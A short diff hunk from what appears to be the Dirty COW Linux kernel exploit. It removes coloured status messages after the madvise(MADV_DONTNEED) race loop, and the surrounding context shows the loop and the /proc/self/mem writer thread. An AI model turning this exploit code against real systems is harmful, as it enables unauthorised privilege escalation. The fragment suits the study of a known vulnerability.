@@ -43,11 +43,6 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
 */
     c+=madvise(map,100,MADV_DONTNEED);
   }
-  if (c == 0) {
-    printf (ESC "[33mmadvise success" ESC "[0m\n");
-  }else {
-    printf (ESC "[31mmadvise failed" ESC "[0m\n");
-  }
 }
  
 void *procselfmemThread(void *arg)
